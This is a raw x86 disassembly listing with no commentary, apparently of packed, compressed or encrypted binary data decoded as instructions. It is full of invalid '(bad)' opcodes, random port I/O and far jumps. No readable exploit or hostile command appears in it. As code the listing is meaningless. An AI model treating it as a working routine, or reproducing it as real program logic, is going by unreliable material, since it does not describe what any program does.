  41f0c5:	mov    WORD PTR [ecx],cs
  41f0c7:	out    0x75,eax
  41f0c9:	add    BYTE PTR [ebp+ecx*8-0x8f99a4],cl
  41f0d0:	mov    dl,0xae
  41f0d2:	(bad)  
  41f0d3:	in     eax,dx
  41f0d4:	test   BYTE PTR [ecx-0x782e55b],cl
  41f0da:	shr    BYTE PTR [edi+ecx*2],1
  41f0dd:	loop   0x41f140
  41f0df:	xchg   ebp,eax
  41f0e0:	fnstcw WORD PTR [ebx-0x6bcfdb31]
  41f0e6:	jnp    0x41f0c2
  41f0e8:	dec    edx
  41f0e9:	je     0x41f115
  41f0eb:	lahf   
  41f0ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f0ed:	repz xchg ecx,eax
  41f0ef:	hlt    
  41f0f0:	dec    eax
  41f0f1:	xor    cl,BYTE PTR [edx+eax*1]
  41f0f4:	popa   
  41f0f5:	bnd jp 0x41f14a
  41f0f8:	test   BYTE PTR [esi+edx*4-0x6],bh
  41f0fc:	push   edx
  41f0fd:	(bad)  
  41f0fe:	fcmovnb st,st(2)
  41f100:	pop    esi
  41f101:	jge    0x41f0e6
  41f103:	push   eax
  41f104:	cmc    
  41f105:	xor    DWORD PTR [eax+0xa],edi
  41f108:	int3   
  41f109:	popa   
  41f10a:	inc    DWORD PTR [edx]
  41f10c:	outs   dx,BYTE PTR ds:[esi]
  41f10d:	mov    ebp,0xafdfce51
  41f113:	shl    BYTE PTR [edx-0x1a47dd91],cl
  41f119:	inc    ecx
  41f11a:	push   ebx
  41f11b:	mov    eax,0x5cb3a2ce
  41f120:	inc    esp
  41f121:	inc    eax
  41f122:	mov    al,ds:0xf7aa769a
  41f127:	xchg   esi,eax
  41f128:	mov    ds:0x6d1c80c2,al
  41f12d:	push   cs
  41f12e:	(bad)  
  41f12f:	add    eax,0x72d222ab
  41f134:	pop    ecx
  41f135:	(bad)  
  41f136:	lock loopne 0x41f175
  41f139:	jmp    0x41f0e9
  41f13b:	cdq    
  41f13c:	leave  
  41f13d:	xchg   edx,eax
  41f13e:	cs sbb bl,ch
	...
  41f1b1:	add    BYTE PTR [eax],al
  41f1b3:	add    BYTE PTR [ebx-0x1988fe],ch
  41f1b9:	idiv   DWORD PTR [ebx-0x11ecebb1]
  41f1bf:	mov    DWORD PTR [ecx-0x22729fe5],ebx
  41f1c5:	dec    ebp
  41f1c6:	add    DWORD PTR [eax],eax
  41f1c8:	cmc    
  41f1c9:	add    BYTE PTR [eax],al
  41f1cb:	add    BYTE PTR [esi+0xcd78988],dl
  41f1d1:	lods   eax,DWORD PTR ds:[esi]
  41f1d2:	jl     0x41f1cf
  41f1d4:	mov    edx,0x97910629
  41f1d9:	pop    esi
  41f1da:	loope  0x41f187
  41f1dc:	daa    
  41f1dd:	(bad)  
  41f1de:	ds and al,0xce
  41f1e1:	scas   eax,DWORD PTR es:[edi]
  41f1e2:	in     eax,dx
  41f1e3:	xor    DWORD PTR [esi+ecx*4-0x477a5e94],eax
  41f1ea:	fwait
  41f1eb:	into   
  41f1ec:	mov    esi,0xc1f43072
  41f1f1:	test   DWORD PTR [edx+0x4a342dcd],0xbee2dc81
  41f1fb:	repnz lea esp,[ebp+0x50422a4c]
  41f202:	fld    DWORD PTR [edx+0x19]
  41f205:	sub    esp,DWORD PTR [edx+0x1]
  41f208:	add    DWORD PTR [ebx+0xe],esp
  41f20b:	repnz mov ds:0x16a2f62c,eax
  41f211:	mov    dh,BYTE PTR [eax-0x23]
  41f214:	mov    gs,esp
  41f216:	and    al,0xd6
  41f218:	sbb    eax,0xa076b263
  41f21d:	mov    ebp,0xfb27f0be
  41f222:	shl    BYTE PTR [edx+0x34196f4a],1
  41f228:	call   0x2dd80dd8
  41f22d:	xor    BYTE PTR [edx],bl
  41f22f:	xchg   BYTE PTR [edi+0x5573e685],ch
  41f235:	xchg   ebx,eax
  41f236:	pop    ebp
  41f237:	cld    
  41f238:	ins    DWORD PTR es:[edi],dx
  41f239:	and    al,0x69
  41f23b:	jmp    FWORD PTR [ebx+0x60]
  41f23e:	dec    esp
  41f23f:	out    0x14,eax
  41f241:	in     al,dx
  41f242:	or     BYTE PTR [ebx+0x1f],bh
  41f245:	mov    al,0xfb
  41f247:	in     eax,0xb2
  41f249:	jp     0x41f262
  41f24b:	cmp    DWORD PTR [eax-0xc],eax
  41f24e:	add    DWORD PTR [ebp-0x3935a990],0x77394e88
  41f258:	out    dx,al
  41f259:	and    ecx,DWORD PTR [ecx-0x2d74e44e]
  41f25f:	adc    DWORD PTR ds:0x578c5d8f,edx
  41f265:	out    dx,al
  41f266:	bound  esi,QWORD PTR [ebp-0x13]
  41f269:	push   ecx
  41f26a:	mov    ?,WORD PTR cs:[ebx-0x3aa5e0ad]
  41f271:	fs (bad) 
  41f273:	fwait
  41f274:	push   ebx
  41f275:	dec    ecx
  41f276:	mov    eax,ds:0xf3b7c613
  41f27b:	out    dx,eax
  41f27c:	push   0xffffffa8
  41f27e:	fidivr DWORD PTR [ebp+0x55053bd6]
  41f284:	aad    0xae
  41f286:	add    eax,0x179eddb2
  41f28b:	int    0xec
  41f28d:	cmp    edx,DWORD PTR [edx]
  41f28f:	scas   al,BYTE PTR es:[edi]
  41f290:	call   0x282:0xb4c986cb
  41f297:	mov    edi,0xe4a3d52d
  41f29c:	pop    esi
  41f29d:	mov    al,0x81
  41f29f:	test   eax,0xeb622ccf
  41f2a4:	cmp    al,ch
  41f2a6:	push   edx
  41f2a7:	dec    esi
  41f2a8:	popf   
  41f2a9:	xor    al,0x9e
  41f2ab:	dec    ebp
  41f2ac:	jns    0x41f257
  41f2ae:	cdq    
  41f2af:	mov    ds:0x417db5ba,eax
  41f2b4:	push   cs
  41f2b5:	bound  eax,QWORD PTR [ebp+edx*8+0x42]
  41f2b9:	loopne 0x41f317
  41f2bb:	je     0x41f28e
  41f2bd:	xchg   edi,eax
  41f2be:	mov    esp,0x9f52
	...
  41f333:	add    BYTE PTR [ecx-0xe088ee],cl
  41f339:	jg     0x41f324
  41f33b:	xchg   esi,eax
  41f33c:	call   0x701c:0x759531a0
  41f343:	adc    al,0xd2
  41f345:	dec    esi
  41f346:	add    DWORD PTR [eax],eax
  41f348:	cmc    
  41f349:	add    BYTE PTR [eax],al
  41f34b:	add    BYTE PTR [ebx-0x14],ah
  41f34e:	adc    DWORD PTR [edx],edx
  41f350:	clc    
  41f351:	loope  0x41f322
  41f353:	ret    0xd5e0
  41f356:	sahf   
  41f357:	ud0    esi,DWORD PTR [edx+0x34615829]
  41f35e:	add    esp,0x448f7976
  41f364:	fwait
  41f365:	xchg   edi,eax
  41f366:	cmp    al,0x5c
  41f368:	in     al,dx
  41f369:	and    dh,BYTE PTR [ebx-0x51]
  41f36c:	sbb    BYTE PTR ds:0xda690d51,ah
  41f372:	pop    ds
  41f373:	adc    ebx,esi
  41f375:	inc    DWORD PTR [eax+0x20912139]
  41f37b:	(bad)  
  41f37d:	push   cs
  41f37e:	mov    bl,0xb0
  41f380:	in     eax,dx
  41f381:	shl    DWORD PTR [ecx],0x69
  41f384:	jmp    0xd6b37a4b
  41f389:	inc    ebx
  41f38a:	jmp    0x3d13b15e
  41f38f:	imul   edx,DWORD PTR [ecx-0x3223cb03],0xffa5d722
  41f399:	jmp    0x41f39b
  41f39b:	jbe    0x41f3c7
  41f39d:	dec    edi
  41f39e:	add    bh,BYTE PTR [ebx]
  41f3a0:	sbb    al,0xff
  41f3a2:	push   0xffffffa6
  41f3a4:	pop    ebp
  41f3a5:	div    ebx
  41f3a7:	jbe    0x41f332
  41f3a9:	mov    ds:0x609fbad4,eax
  41f3ae:	shl    BYTE PTR [ebx],cl
  41f3b0:	in     eax,dx
  41f3b1:	jp     0x41f380
  41f3b3:	retf   
  41f3b4:	mov    ds:0x59237b99,al
  41f3b9:	retf   
  41f3ba:	ins    DWORD PTR es:[edi],dx
  41f3bb:	(bad)  
  41f3bc:	mov    ah,0x35
  41f3be:	jbe    0x41f406
  41f3c0:	push   edi
  41f3c1:	mov    al,0x15
  41f3c3:	add    dl,BYTE PTR [edi+0x7fb4ed46]
  41f3c9:	dec    edx
  41f3ca:	ret    0x18b8
  41f3cd:	dec    eax
  41f3ce:	xchg   ebp,eax
  41f3cf:	not    esi
  41f3d1:	outs   dx,BYTE PTR ds:[esi]
  41f3d2:	fsubr  st(6),st
  41f3d4:	retf   0x88b6
  41f3d7:	mov    ds:0x7df866ec,eax
  41f3dc:	jnp    0x41f3bd
  41f3de:	xchg   edi,eax
  41f3df:	push   esp
  41f3e0:	add    dl,BYTE PTR [edi-0x14bdf942]
  41f3e6:	nop
  41f3e7:	jle    0x41f3d8
  41f3e9:	adc    ch,BYTE PTR [eax-0x6d0c4801]
  41f3ef:	add    BYTE PTR [edi+0x30cca9dc],0x67
  41f3f6:	out    0x6d,al
  41f3f8:	gs ins BYTE PTR es:[edi],dx
  41f3fa:	push   edi
  41f3fb:	or     eax,0xd21a5511
  41f400:	xor    DWORD PTR ds:0x89135f75,0x3a
  41f407:	cmc    
  41f408:	and    ah,0xdc
  41f40b:	pop    esi
  41f40c:	repz and al,0x34
  41f40f:	push   ebp
  41f410:	ins    DWORD PTR es:[edi],dx
  41f411:	inc    esp
  41f412:	push   edx
  41f413:	lods   eax,DWORD PTR ds:[esi]
  41f414:	mov    bl,0xe0
  41f416:	dec    ebx
  41f417:	ss addr16 push 0x47bb716e
  41f41e:	test   DWORD PTR [edi-0x24],edx
  41f421:	sub    al,0x72
  41f423:	daa    
  41f424:	lahf   
  41f425:	mov    ch,0x92
  41f427:	mov    bl,0xbd
  41f429:	pop    ecx
  41f42a:	xlat   BYTE PTR ds:[ebx]
  41f42b:	into   
  41f42c:	rcl    BYTE PTR [esi+0x14],0x38
  41f430:	pop    edx
  41f431:	outs   dx,BYTE PTR ds:[esi]
  41f432:	add    BYTE PTR [esi+esi*1-0x1f5a60b3],ah
  41f439:	cli    
  41f43a:	or     dl,BYTE PTR [ecx+0x26650b32]
  41f440:	rol    DWORD PTR [eax],cl
	...
  41f4b2:	add    BYTE PTR [eax],al
  41f4b4:	and    BYTE PTR [edx-0x35],ch
  41f4b7:	dec    ebx
  41f4b8:	retf   
  41f4b9:	jmp    0x41f45b
  41f4bb:	imul   ebx,DWORD PTR [ebx],0xfffffff6
  41f4be:	xchg   esp,eax
  41f4bf:	aad    0x7d
  41f4c1:	(bad)  
  41f4c2:	mov    ebp,0x14fc7d5
  41f4c7:	add    ch,dh
  41f4c9:	add    BYTE PTR [eax],al
  41f4cb:	add    BYTE PTR [eax+0x39d03c3c],bl
  41f4d1:	scas   eax,DWORD PTR es:[edi]
  41f4d2:	int3   
  41f4d3:	fidiv  DWORD PTR [ebx+eiz*4]
  41f4d6:	inc    ecx
  41f4d7:	sub    BYTE PTR [edi],ch
  41f4d9:	retf   
  41f4da:	xor    ch,BYTE PTR [ecx-0x7ae78cd4]
  41f4e0:	out    dx,eax
  41f4e1:	push   es
  41f4e2:	sub    esp,DWORD PTR [ecx]
  41f4e4:	lds    ebx,FWORD PTR [eax]
  41f4e6:	cmp    ch,BYTE PTR [esi+esi*1+0x4d9a18d2]
  41f4ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f4ee:	cmp    eax,ecx
  41f4f0:	out    0x7e,al
  41f4f2:	and    BYTE PTR [eax+0x5abcdf06],0x3d
  41f4f9:	inc    ecx
  41f4fa:	add    ah,BYTE PTR [ebx-0x552c7e36]
  41f500:	lahf   
  41f501:	imul   DWORD PTR [esp+eax*8-0x11892f31]
  41f508:	push   eax
  41f509:	lods   al,BYTE PTR ds:[esi]
  41f50a:	aad    0x20
  41f50c:	js     0x41f4ad
  41f50e:	push   edx
  41f50f:	out    dx,al
  41f510:	fisttp QWORD PTR [edx+ebp*1+0x53]
  41f514:	sub    BYTE PTR [ebx+0x36],bl
  41f517:	fidivr DWORD PTR [esi]
  41f519:	test   BYTE PTR [ecx-0x7],ch
  41f51c:	mov    eax,ds:0x2bb9abe0
  41f521:	popf   
  41f522:	dec    eax
  41f523:	ret    
  41f524:	arpl   WORD PTR [ecx],bp
  41f526:	rol    DWORD PTR [edi-0x46],cl
  41f529:	mov    eax,0xe9946928
  41f52e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f52f:	sar    edi,cl
  41f531:	into   
  41f532:	je     0x41f527
  41f534:	fisubr DWORD PTR [ebp+edi*1-0x17]
  41f538:	mov    ds:0xd1c66b9f,al
  41f53d:	dec    ebp
  41f53e:	adc    ecx,esi
  41f540:	sbb    cl,BYTE PTR [ebx]
  41f542:	imul   eax,DWORD PTR [ebx+0x6c],0xe70cdf04
  41f549:	adc    DWORD PTR [ecx+0x74],eax
  41f54c:	dec    esi
  41f54d:	outs   dx,BYTE PTR ds:[esi]
  41f54e:	inc    edi
  41f54f:	test   eax,0xf5427954
  41f554:	ss or  al,0x62
  41f557:	jnp    0x41f59b
  41f559:	and    cl,BYTE PTR [eax-0x5e5c1446]
  41f55f:	fcom   DWORD PTR [edi]
  41f561:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f562:	aam    0xfc
  41f564:	loope  0x41f534
  41f566:	mov    ebp,DWORD PTR [ebp+ecx*4+0x21]
  41f56a:	loopne 0x41f540
  41f56c:	shr    ah,1
  41f56e:	cmp    eax,0x96873745
  41f573:	push   eax
  41f574:	loop   0x41f579
  41f576:	shr    DWORD PTR [ecx],1
  41f578:	dec    DWORD PTR [edx+0x7f]
  41f57b:	or     eax,ebx
  41f57d:	inc    ebx
  41f57e:	cli    
  41f57f:	push   esp
  41f580:	inc    edx
  41f581:	xor    al,0x88
  41f583:	sbb    BYTE PTR [ebx-0x2a],ah
  41f586:	es daa 
  41f588:	bound  esi,QWORD PTR [esi]
  41f58a:	dec    eax
  41f58b:	pop    edx
  41f58c:	push   cs
  41f58d:	jle    0x41f55b
  41f58f:	adc    al,0xec
  41f591:	jnp    0x41f602
  41f593:	mov    al,ds:0xaff20f81
  41f598:	mov    ebp,0x89c1bb29
  41f59d:	bound  esp,QWORD PTR [eax-0x7409a5a9]
  41f5a3:	test   BYTE PTR [ebx],dh
  41f5a5:	mov    ebp,0x11b8c99a
  41f5aa:	mov    edx,0x20d33d71
  41f5af:	xchg   edx,eax
  41f5b0:	add    edi,ebx
  41f5b2:	dec    esp
  41f5b3:	xor    dl,BYTE PTR [ecx]
  41f5b5:	sub    DWORD PTR [ebx-0x3],0x6ee2e236
  41f5bc:	mov    al,0x63
  41f5be:	cmp    DWORD PTR [edi],esp
  41f5c0:	jge    0x41f5c2
	...
  41f632:	add    BYTE PTR [eax],al
  41f634:	lds    ebx,FWORD PTR [eax+0x7dfd55e1]
  41f63a:	cmc    
  41f63b:	cwde   
  41f63c:	and    eax,0x3501e835
  41f641:	sbb    DWORD PTR [ebx+ecx*1-0x44],0x50
  41f646:	add    DWORD PTR [eax],eax
  41f648:	cmc    
  41f649:	add    BYTE PTR [eax],al
  41f64b:	add    BYTE PTR [eax-0x80],ch
  41f64e:	xor    eax,0x80621427
  41f653:	punpcklbw mm2,DWORD PTR [ebp-0x5d]
  41f657:	repz jge 0x41f61e
  41f65a:	and    bl,BYTE PTR [eax+0x30]
  41f65d:	je     0x41f672
  41f65f:	jl     0x41f658
  41f661:	repz push es
  41f663:	sahf   
  41f664:	aad    0x2f
  41f666:	nop
  41f667:	daa    
  41f668:	jno    0x41f637
  41f66a:	ja     0x41f6db
  41f66c:	add    dh,BYTE PTR [edx+0x26]
  41f66f:	js     0x41f6a3
  41f671:	sub    cl,bl
  41f673:	xor    DWORD PTR [esi-0x41],edi
  41f676:	and    BYTE PTR [ebx+0x1d206e0a],ah
  41f67c:	push   DWORD PTR [edx-0x4bea9dc3]
  41f682:	add    ch,BYTE PTR [esi-0x57]
  41f685:	or     esp,DWORD PTR [ebx-0x79]
  41f688:	cmp    edx,DWORD PTR [ebx-0x1d]
  41f68b:	sub    DWORD PTR [edx-0x2af64ee8],eax
  41f691:	jge    0x41f6f2
  41f693:	into   
  41f694:	push   edx
  41f695:	lods   al,BYTE PTR ds:[esi]
  41f696:	loopne 0x41f6a9
  41f698:	push   0x37e7f12c
  41f69d:	fdivr  DWORD PTR [esi-0x61e3d13e]
  41f6a3:	loop   0x41f63e
  41f6a5:	inc    edi
  41f6a6:	mov    bl,0xf
  41f6a8:	mov    bl,0x69
  41f6aa:	fist   WORD PTR [ecx]
  41f6ac:	(bad)  
  41f6ad:	enter  0xd84,0x56
  41f6b1:	call   0x6ff1:0x38568ceb
  41f6b8:	ss pop esi
  41f6ba:	fsubr  DWORD PTR [ecx-0x2f]
  41f6bd:	scas   al,BYTE PTR es:[edi]
  41f6be:	cs push eax
  41f6c0:	jge    0x41f649
  41f6c2:	cmp    bl,BYTE PTR [edi+0x26]
  41f6c5:	cwde   
  41f6c6:	pop    edx
  41f6c7:	jmp    0x34e5:0x55929554
  41f6ce:	popa   
  41f6cf:	xchg   ecx,eax
  41f6d0:	dec    eax
  41f6d1:	(bad)  
  41f6d3:	bound  eax,QWORD PTR [edx-0x26]
  41f6d6:	into   
  41f6d7:	bound  esi,QWORD PTR [ecx+0x6b818309]
  41f6dd:	rcl    BYTE PTR ds:[esi+0x6],0x34
  41f6e2:	mov    al,ds:0x7a76fc58
  41f6e7:	mov    edi,0x8c4b8bbc
  41f6ec:	repz sbb dh,bh
  41f6ef:	in     al,dx
  41f6f0:	cmp    DWORD PTR [ecx+ecx*2+0x6d],esp
  41f6f4:	dec    edx
  41f6f5:	adc    esp,esp
  41f6f7:	add    cl,BYTE PTR [edi-0x15754090]
  41f6fd:	and    cl,dh
  41f6ff:	shl    DWORD PTR ds:0x53654a44,1
  41f705:	cmp    cl,ah
  41f707:	pop    eax
  41f708:	je     0x41f6e8
  41f70a:	pop    esp
  41f70b:	(bad)  
  41f70c:	mov    dl,0x92
  41f70e:	in     eax,dx
  41f70f:	sub    al,0x5c
  41f711:	and    al,BYTE PTR [eax-0xa389caa]
  41f717:	xor    eax,0xa7d55c54
  41f71c:	jmp    0x41f765
  41f71e:	test   BYTE PTR [ecx+0x53],bh
  41f721:	mov    es,WORD PTR [ecx-0x1a]
  41f724:	add    DWORD PTR [edi],esi
  41f726:	in     eax,0xcc
  41f728:	paddusb mm0,QWORD PTR [edi]
  41f72b:	xor    eax,0xb0d5498b
  41f730:	repz cwde 
  41f732:	xchg   edi,eax
  41f733:	hlt    
  41f734:	aad    0x8f
  41f736:	push   ds
  41f737:	mov    WORD PTR [eax-0x4c],es
  41f73a:	and    edi,DWORD PTR [edx-0x22]
  41f73d:	aas    
  41f73e:	ds int3 
  41f740:	daa    
	...
  41f7b1:	add    BYTE PTR [eax],al
  41f7b3:	add    BYTE PTR ds:0x9e5c8a39,ch
  41f7b9:	(bad)  
  41f7ba:	(bad)  
  41f7bb:	jns    0x41f77e
  41f7bd:	clc    
  41f7be:	mov    ah,0x9e
  41f7c0:	cmc    
  41f7c1:	mov    dl,0xbb
  41f7c3:	cmp    eax,0x151b1
  41f7c8:	cmc    
  41f7c9:	add    BYTE PTR [eax],al
  41f7cb:	add    BYTE PTR [ebp*4+0x440dd5ed],bh
  41f7d2:	add    DWORD PTR [edx],eax
  41f7d4:	jne    0x41f7b8
  41f7d6:	sbb    ch,BYTE PTR gs:[eax-0x22]
  41f7da:	lods   al,BYTE PTR ds:[esi]
  41f7db:	out    0x5a,al
  41f7dd:	iret   
  41f7de:	lods   al,BYTE PTR ds:[esi]
  41f7df:	shl    DWORD PTR [edi+0x4e],cl
  41f7e2:	(bad)  
  41f7e3:	fnstsw WORD PTR [edi+edx*8+0x26d5b35b]
  41f7ea:	ss inc ch
  41f7ed:	xor    al,0x23
  41f7ef:	inc    esp
  41f7f0:	fs (bad) 
  41f7f2:	inc    ecx
  41f7f3:	pop    edx
  41f7f4:	retf   0x89e9
  41f7f7:	popf   
  41f7f8:	pop    ecx
  41f7f9:	xchg   ecx,eax
  41f7fa:	xchg   esi,eax
  41f7fb:	mov    esi,0x3471c5e9
  41f800:	xchg   ebp,eax
  41f801:	icebp  
  41f802:	mul    DWORD PTR [ebp+0x342c45ac]
  41f808:	cwde   
  41f809:	add    edx,DWORD PTR [eax]
  41f80b:	sub    cl,BYTE PTR [edx-0x5f]
  41f80e:	mov    eax,0xa2a0adce
  41f813:	ror    DWORD PTR [ebp+0x62462dfa],0x79
  41f81a:	add    BYTE PTR [eax],ah
  41f81c:	cdq    
  41f81d:	hlt    
  41f81e:	cmp    bl,BYTE PTR [edx-0x67]
  41f821:	loopne 0x41f7a3
  41f823:	sub    eax,0xa32c2b5a
  41f828:	push   ss
  41f829:	jns    0x41f83f
  41f82b:	loopne 0x41f7cc
  41f82d:	arpl   WORD PTR [ebx-0x5bfc0052],bx
  41f833:	dec    ecx
  41f834:	jbe    0x41f856
  41f836:	xchg   ebp,eax
  41f837:	sub    cl,BYTE PTR ds:0x6211a6ff
  41f83d:	jg     0x41f89f
  41f83f:	sti    
  41f840:	jne    0x41f876
  41f842:	sub    esi,esi
  41f844:	inc    edi
  41f845:	jmp    0x41f8ae
  41f847:	aam    0xec
  41f849:	sub    ch,BYTE PTR [eax+0x334836b8]
  41f84f:	enter  0x6946,0x80
  41f853:	retf   
  41f854:	sahf   
  41f855:	mov    dl,0x9a
  41f857:	jg     0x41f839
  41f859:	sbb    ecx,esi
  41f85b:	clc    
  41f85c:	inc    eax
  41f85d:	sbb    eax,0x50819524
  41f862:	stc    
  41f863:	sti    
  41f864:	jb     0x41f88e
  41f866:	call   DWORD PTR [ecx+0x25]
  41f869:	outs   dx,BYTE PTR ds:[esi]
  41f86a:	add    eax,0x71adf732
  41f86f:	aad    0x97
  41f871:	mov    al,ch
  41f873:	iret   
  41f874:	sti    
  41f875:	add    al,0x5c
  41f877:	inc    esi
  41f878:	repz (bad) 
  41f87a:	pop    ebp
  41f87b:	les    esp,FWORD PTR [eax-0x4b]
  41f87e:	dec    DWORD PTR [edx+0x69]
  41f881:	enter  0x8bdc,0xd9
  41f885:	inc    ebp
  41f886:	std    
  41f887:	mov    edx,DWORD PTR [esi-0xd]
  41f88a:	shl    DWORD PTR [eax+0x4d97ab9f],cl
  41f890:	cmp    dh,dl
  41f892:	imul   esp,ecx,0x5219f1e
  41f898:	daa    
  41f899:	pop    ebx
  41f89a:	mov    ah,dl
  41f89c:	or     BYTE PTR [esi],dl
  41f89e:	push   edi
  41f89f:	not    DWORD PTR [ecx]
  41f8a1:	int3   
  41f8a2:	(bad)  
  41f8a3:	in     eax,dx
  41f8a4:	fistp  WORD PTR [bx+si+0x64bf]
  41f8a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f8aa:	mov    al,ds:0x29f7b8e8
  41f8af:	jae    0x41f89d
  41f8b1:	in     al,dx
  41f8b2:	ins    BYTE PTR es:[edi],dx
  41f8b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f8b4:	adc    ebp,DWORD PTR [bx+si]
  41f8b7:	dec    esp
  41f8b8:	enter  0xcf63,0x5a
  41f8bc:	push   eax
  41f8bd:	je     0x41f86b
  41f8bf:	in     al,dx
  41f8c0:	iret   
	...
  41f931:	add    BYTE PTR [eax],al
  41f933:	add    BYTE PTR [eax-0x3],bh
  41f936:	ret    0xc766
  41f939:	jg     0x41f937
  41f93b:	(bad)  
  41f93c:	mov    ecx,0xea9ffef7
  41f941:	sbb    eax,0x52a61198
  41f946:	add    DWORD PTR [eax],eax
  41f948:	cmc    
  41f949:	add    BYTE PTR [eax],al
  41f94b:	add    BYTE PTR [ebp+eax*4-0xfdf3aed],bl
  41f952:	push   ecx
  41f953:	jge    0x41f8f1
  41f955:	mov    eax,ds:0x1d71b293
  41f95a:	(bad)  
  41f95b:	popf   
  41f95c:	sbb    al,BYTE PTR cs:[ebx]
  41f95f:	or     al,0xc4
  41f961:	inc    ebp
  41f962:	cmp    al,0xff
  41f964:	push   edi
  41f965:	jmp    0x41f97c
  41f967:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f968:	popf   
  41f969:	mov    bl,0x8e
  41f96b:	daa    
  41f96c:	xchg   DWORD PTR [edi],edi
  41f96e:	pop    ebp
  41f96f:	sbb    eax,0x6596020b
  41f974:	xchg   ebp,eax
  41f975:	loop   0x41f94d
  41f977:	cmp    DWORD PTR [edx-0x1e2a88e0],ebx
  41f97d:	mov    eax,DWORD PTR [edx]
  41f97f:	cs clc 
  41f981:	dec    edi
  41f982:	adc    eax,0x66702547
  41f987:	aad    0xc1
  41f989:	stos   BYTE PTR es:[edi],al
  41f98a:	dec    ebx
  41f98b:	leave  
  41f98c:	aaa    
  41f98d:	add    al,0x14
  41f98f:	stos   BYTE PTR es:[edi],al
  41f990:	outs   dx,DWORD PTR ds:[esi]
  41f991:	xor    al,0xe0
  41f993:	sbb    ecx,DWORD PTR ds:0xd0e7e9af
  41f999:	bound  ebp,QWORD PTR [ebx]
  41f99b:	enter  0xe0c7,0x88
  41f99f:	aas    
  41f9a0:	jl     0x41fa0f
  41f9a2:	push   ebx
  41f9a3:	hlt    
  41f9a4:	aas    
  41f9a5:	out    dx,eax
  41f9a6:	pop    edx
  41f9a7:	push   0xffffff99
  41f9a9:	push   0x7c3b04c6
  41f9ae:	sar    ebx,1
  41f9b0:	imul   eax,DWORD PTR [ebx+0x4b],0x48
  41f9b4:	mov    dl,0xfb
  41f9b6:	lods   al,BYTE PTR ds:[esi]
  41f9b7:	add    DWORD PTR [ebp+0x55b249e0],0x9f8dfe04
  41f9c1:	daa    
  41f9c2:	xor    eax,0xe711e01a
  41f9c7:	and    DWORD PTR [ecx+0x3d503551],0x4
  41f9ce:	fnstcw WORD PTR [ecx+0x1e]
  41f9d1:	test   al,0x95
  41f9d3:	sbb    ecx,DWORD PTR [ebp+0x2a]
  41f9d6:	mov    ds:0xd5fd7b9a,al
  41f9db:	test   al,0xed
  41f9dd:	mov    ecx,0x7a79e436
  41f9e2:	pop    ebx
  41f9e3:	mov    esp,0xeaf5e3cd
  41f9e8:	lock aad 0x89
  41f9eb:	dec    ecx
  41f9ec:	mov    ebp,0xa424932e
  41f9f1:	dec    edx
  41f9f2:	and    al,0x6d
  41f9f4:	aam    0xcb
  41f9f6:	xchg   edx,eax
  41f9f7:	test   ecx,esi
  41f9f9:	test   al,0x95
  41f9fb:	push   edx
  41f9fc:	aaa    
  41f9fd:	test   BYTE PTR [ebp+0x7bb580d7],cl
  41fa03:	jmp    0x76e64b4b
  41fa08:	sbb    al,0xfa
  41fa0a:	loopne 0x41fa75
  41fa0c:	sub    dh,BYTE PTR [edi]
  41fa0e:	jae    0x41f9e7
  41fa10:	mov    ecx,0x3debdb10
  41fa15:	sbb    esp,esp
  41fa17:	pusha  
  41fa18:	push   esp
  41fa19:	sar    ebp,0x88
  41fa1c:	pop    ebp
  41fa1d:	dec    ah
  41fa1f:	pushf  
  41fa20:	mov    eax,ds:0xf8a2937a
  41fa25:	ins    DWORD PTR es:[edi],dx
  41fa26:	ret    
  41fa27:	xor    esp,edx
  41fa29:	xor    al,0xda
  41fa2b:	add    edx,esp
  41fa2d:	push   ebp
  41fa2e:	or     al,0x8a
  41fa30:	js     0xaa73e7a1
  41fa36:	cmp    dl,ah
  41fa38:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fa39:	adc    DWORD PTR [edi-0x2a],eax
  41fa3c:	add    eax,0x2742dae9
	...
  41fab1:	add    BYTE PTR [eax],al
  41fab3:	add    BYTE PTR [edx],dl
  41fab5:	das    
  41fab6:	mov    esi,DWORD PTR [edi+edi*4+0x4eaf3fb4]
  41fabd:	cwde   
  41fabe:	out    dx,eax
  41fabf:	daa    
  41fac0:	int3   
  41fac1:	idiv   eax
  41fac3:	(bad)  
  41fac4:	fwait
  41fac5:	push   ebx
  41fac6:	add    DWORD PTR [eax],eax
  41fac8:	cmc    
  41fac9:	add    BYTE PTR [eax],al
  41facb:	add    BYTE PTR [ebp+0x9e686b5],dl
  41fad1:	inc    ebp
  41fad2:	mov    WORD PTR [eax+0xd],cs
  41fad5:	and    eax,edi
  41fad7:	jecxz  0x41fa9a
  41fad9:	dec    ecx
  41fada:	pushf  
  41fadb:	loope  0x41fb4b
  41fadd:	ja     0x41fa9c
  41fadf:	shl    DWORD PTR [edi],0xdf
  41fae2:	scas   al,BYTE PTR es:[edi]
  41fae3:	clc    
  41fae4:	iret   
  41fae5:	pop    es
  41fae6:	mov    ah,0x79
  41fae8:	jnp    0x41fb68
  41faea:	fcom   QWORD PTR [edi+0x4]
  41faed:	add    ebp,ebp
  41faef:	in     al,dx
  41faf0:	sbb    ebp,esp
  41faf2:	lahf   
  41faf3:	aam    0xf0
  41faf5:	or     DWORD PTR [edi+0x53260a57],ebx
  41fafb:	mov    BYTE PTR [ebp+0x76],cl
  41fafe:	cmp    BYTE PTR [edx],0xbc
  41fb01:	in     al,0xd1
  41fb03:	cmp    al,0x13
  41fb05:	fstp   DWORD PTR [ebx]
  41fb07:	call   0x716c:0xdac88fc7
  41fb0e:	mov    edi,ebx
  41fb10:	fwait
  41fb11:	adc    bh,bl
  41fb13:	(bad)  
  41fb14:	pop    eax
  41fb15:	sub    al,0x72
  41fb17:	fidiv  DWORD PTR [esi]
  41fb19:	arpl   WORD PTR [ebx-0x3f],cx
  41fb1c:	nop
  41fb1d:	jecxz  0x41fb1c
  41fb1f:	push   ebx
  41fb20:	xchg   edx,eax
  41fb21:	push   edx
  41fb22:	fdiv   st(5),st
  41fb24:	inc    eax
  41fb25:	dec    ecx
  41fb26:	(bad)  
  41fb27:	ins    BYTE PTR es:[edi],dx
  41fb28:	mov    edi,0xc1240c24
  41fb2d:	xor    DWORD PTR [eax+0x6f],edi
